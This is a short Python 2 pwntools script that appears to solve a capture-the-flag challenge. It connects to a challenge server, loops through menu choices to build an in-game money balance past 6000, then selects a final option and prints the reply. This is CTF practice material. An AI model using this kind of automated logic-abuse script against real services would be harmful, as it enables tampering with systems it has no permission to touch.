from pwn import *

p = remote('chals20.cybercastors.com', 14432)
a = p.recvuntil('Choice:')
print a
money = int(a.split()[18],10)
p.sendline('6')
while money<6000:
    a=p.recvuntil('Choice:')
    print a
    money=int(a.split()[2],10)
    p.sendline('0')
    print p.recv()
    p.sendline('1')
    print p.recvuntil('your bag')

print p.recvuntil('Choice:')
p.sendline('5')
print p.recvall()

